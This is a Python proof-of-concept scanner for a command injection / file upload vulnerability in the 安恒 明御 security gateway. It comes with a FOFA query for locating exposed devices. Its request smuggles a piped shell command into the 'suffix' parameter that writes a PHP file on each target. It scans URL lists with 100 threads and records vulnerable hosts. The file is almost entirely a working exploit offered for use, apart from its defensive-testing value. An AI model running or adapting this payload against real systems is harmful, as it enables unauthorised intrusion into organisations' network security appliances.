# 安恒明御安全网关 aaa_local_web_preview存在文件上传漏洞
# fofa:title=="明御安全网关"

import argparse,requests
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """                              _                      
       _                     ( )                   _ 
      (_)   _ _    _     ___ | |__   _   _    _ _ (_)
(`\/')| | /'_` ) /'_`\ /',__)|  _ `\( ) ( ) /'_` )| |
 >  < | |( (_| |( (_) )\__, \| | | || (_) |( (_| || |  version:1.0.0
(_/\_)(_)`\__,_)`\___/'(____/(_) (_)`\___/'`\__,_)(_)  author :冷酷小帅                                        
"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="安恒明御安全网关aaa_local_web_preview存在文件上传漏洞")
    parser.add_argument("-u", "--url",dest='url',type=str, help="Please input url")
    parser.add_argument("-f","--file",dest='file',type=str,help="Please input file path")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()

def poc(target):
    payload_url = '/webui/?g=aaa_portal_auth_local_submit&bkg_flag=0&$type=1&suffix=1%7Cecho+%22415066557%22+%3E+.87919.php'
    url = target + payload_url
    headers = {
        'User-Agent':'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',
        'Accept':'*/*',
        'Connection':'Keep-Alive'
    }
    try:
        res = requests.get(url=url,headers=headers,timeout=5,verify=False).text
        if 'success' in res:
            print(f'[+]该url:{target}存在漏洞')
            with open('result.txt','a',encoding='utf-8') as f:
                f.write(f'[+]该url:{target}存在漏洞')
        else:
            print(f'[-]该url:{target}不存在漏洞')
    except:
        print(f'[-]该url:{target}存在访问问题，请手动测试')

if __name__ == '__main__':
    main()